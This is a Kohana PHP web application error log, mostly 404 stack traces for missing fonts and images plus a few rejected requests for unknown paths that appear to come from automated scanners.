2025-10-24 19:06:22 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Light_Italic-webfont.svg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:06:22 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Light_Italic-webfont.svg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:06:23 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Light_Italic-webfont.woff ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:06:23 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Light_Italic-webfont.woff ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:06:25 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Light_Italic-webfont.eot ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:06:25 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Light_Italic-webfont.eot ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:06:26 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/select2x2.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:06:26 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/select2x2.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:06:27 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/calendar/css/images/ui-icons_222222_256x240.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:06:27 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/calendar/css/images/ui-icons_222222_256x240.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:06:30 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Light_Italic-webfont.ttf ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:06:30 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/fonts/Sansation_Light_Italic-webfont.ttf ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:06:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/reset.css ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:06:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/reset.css ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:06:46 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/bootstrap-3.2.0/vendor/bootstrap/fonts/glyphicons-halflings-regular.woff2 ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:06:46 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/bootstrap-3.2.0/vendor/bootstrap/fonts/glyphicons-halflings-regular.woff2 ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:07:09 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/' + SrcPath + '/public/css/img/ajax-loaders/ajax-loader-1.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:07:09 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/' + SrcPath + '/public/css/img/ajax-loaders/ajax-loader-1.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:07:11 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/' + SrcPath + '/public/css/img/ajax-loaders/ajax-loader-4.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:07:11 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/' + SrcPath + '/public/css/img/ajax-loaders/ajax-loader-4.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:07:12 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/calendar/css/images/ui-bg_diagonal-maze_40_000000_10x10.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:07:12 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/calendar/css/images/ui-bg_diagonal-maze_40_000000_10x10.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:07:22 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/calendar/css/images/ui-icons_222222_256x240.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:07:22 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/calendar/css/images/ui-icons_222222_256x240.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:07:31 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/calendar/css/images/ui-icons_ffffff_256x240.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:07:31 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/calendar/css/images/ui-icons_ffffff_256x240.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:07:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/calendar/css/images/ui-icons_8c291d_256x240.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:07:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/calendar/css/images/ui-icons_8c291d_256x240.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:07:37 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/calendar/css/images/ui-icons_3572ac_256x240.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:07:37 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/calendar/css/images/ui-icons_3572ac_256x240.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:07:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/calendar/css/images/ui-icons_3572ac_256x240.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:07:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/calendar/css/images/ui-icons_3572ac_256x240.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:07:41 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/calendar/css/images/ui-icons_fbdb93_256x240.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:07:41 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/calendar/css/images/ui-icons_fbdb93_256x240.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:07:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/calendar/css/images/ui-icons_8c291d_256x240.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:07:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/calendar/css/images/ui-icons_8c291d_256x240.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:08:11 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/calendar/css/images/ui-bg_diagonal-maze_40_000000_10x10.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:08:11 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/calendar/css/images/ui-bg_diagonal-maze_40_000000_10x10.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:08:23 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/calendar/css/images/ui-bg_fine-grain_15_ffffff_60x60.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:08:23 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/calendar/css/images/ui-bg_fine-grain_15_ffffff_60x60.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:08:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/calendar/css/images/ui-bg_fine-grain_68_b83400_60x60.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:08:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/calendar/css/images/ui-bg_fine-grain_68_b83400_60x60.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:08:38 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/calendar/css/images/ui-bg_fine-grain_65_654b24_60x60.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:08:38 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js/calendar/css/images/ui-bg_fine-grain_65_654b24_60x60.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:08:41 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/calendar/css/images/ui-bg_fine-grain_15_eceadf_60x60.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:08:41 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/calendar/css/images/ui-bg_fine-grain_15_eceadf_60x60.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:08:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/calendar/css/images/ui-bg_fine-grain_10_f8f7f6_60x60.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:08:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/calendar/css/images/ui-bg_fine-grain_10_f8f7f6_60x60.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:08:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/calendar/css/images/ui-bg_diagonal-maze_20_6e4f1c_10x10.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:08:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/calendar/css/images/ui-bg_diagonal-maze_20_6e4f1c_10x10.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:08:44 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/calendar/css/images/ui-bg_fine-grain_15_d3c05a_60x60.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:08:44 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/calendar/css/images/ui-bg_fine-grain_15_d3c05a_60x60.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:08:46 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/calendar/css/images/ui-bg_fine-grain_10_eceadf_60x60.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:08:46 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/calendar/css/images/ui-bg_fine-grain_10_eceadf_60x60.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:08:52 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/calendar/css/images/ui-bg_fine-grain_65_654b24_60x60.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:08:52 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/calendar/css/images/ui-bg_fine-grain_65_654b24_60x60.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:08:54 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/calendar/css/images/ui-bg_fine-grain_68_b83400_60x60.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:08:54 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/js-170518/calendar/css/images/ui-bg_fine-grain_68_b83400_60x60.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:10:34 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/img/ios-style-checkboxes/on.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:10:34 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/img/ios-style-checkboxes/on.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:10:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/img/ios-style-checkboxes/off.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:10:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/img/ios-style-checkboxes/off.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:11:26 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/img/ios-style-checkboxes/slider_left.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:11:26 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/img/ios-style-checkboxes/slider_left.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:11:31 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/img/ios-style-checkboxes/slider_right.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:11:31 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/img/ios-style-checkboxes/slider_right.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:11:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/img/ios-style-checkboxes/slider_center.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:11:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/img/ios-style-checkboxes/slider_center.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:11:37 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/img/ios-style-checkboxes/slider_left.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:11:37 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/img/ios-style-checkboxes/slider_left.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:11:38 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/img/ios-style-checkboxes/slider_center.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:11:38 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/img/ios-style-checkboxes/slider_center.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:11:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/img/ios-style-checkboxes/on.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:11:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/img/ios-style-checkboxes/on.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:11:41 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/img/ios-style-checkboxes/slider_right.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:11:41 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css/img/ios-style-checkboxes/slider_right.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:11:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/img/ios-style-checkboxes/off.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:11:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/css-170518/img/ios-style-checkboxes/off.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:21:03 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: https:/34.28.184.113/public/uploads/favicon ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:21:03 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: https:/34.28.184.113/public/uploads/favicon ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 19:32:25 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/luci/;stok=/locale ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 19:32:25 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/luci/;stok=/locale ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 20:07:47 --- ERROR: ErrorException [ 8 ]: Undefined index: HTTP_HOST ~ APPPATH/classes/common_config.php [ 335 ]
2025-10-24 20:07:47 --- STRACE: ErrorException [ 8 ]: Undefined index: HTTP_HOST ~ APPPATH/classes/common_config.php [ 335 ]
--
#0 /var/www/html/application/classes/common_config.php(335): Kohana_Core::error_handler(8, 'Undefined index...', '/var/www/html/a...', 335, Array)
#1 /var/www/html/application/bootstrap.php(477): require('/var/www/html/a...')
#2 /var/www/html/index.php(107): require('/var/www/html/a...')
#3 {main}
2025-10-24 20:15:33 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL ab2g was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 20:15:33 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL ab2g was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 20:15:34 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL ab2h was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 20:15:34 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL ab2h was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 20:15:34 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: alive.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 20:15:34 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: alive.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 20:15:38 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL t4 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 20:15:38 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL t4 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 20:15:39 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 20:15:39 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 20:15:40 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL teorema505 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 20:15:40 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL teorema505 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 20:49:00 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL portal/redlion was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 20:49:00 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL portal/redlion was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 20:51:38 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/luci/;stok=/locale ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 20:51:38 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/luci/;stok=/locale ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 21:03:00 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL login was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 21:03:00 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL login was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 21:03:29 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: pyip=18.178.124.68 ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 21:03:29 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: pyip=18.178.124.68 ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 21:03:31 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: pyip=18.178.124.68 ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 21:03:31 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: pyip=18.178.124.68 ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 21:03:32 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: pyip=18.178.124.68 ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 21:03:32 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: pyip=18.178.124.68 ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 21:03:34 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: pyip=18.178.124.68 ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 21:03:34 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: pyip=18.178.124.68 ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 22:14:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 22:14:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 22:29:19 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/luci/;stok=/locale ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 22:29:19 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/luci/;stok=/locale ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 23:25:28 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/luci/;stok=/locale ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 23:25:28 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/luci/;stok=/locale ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
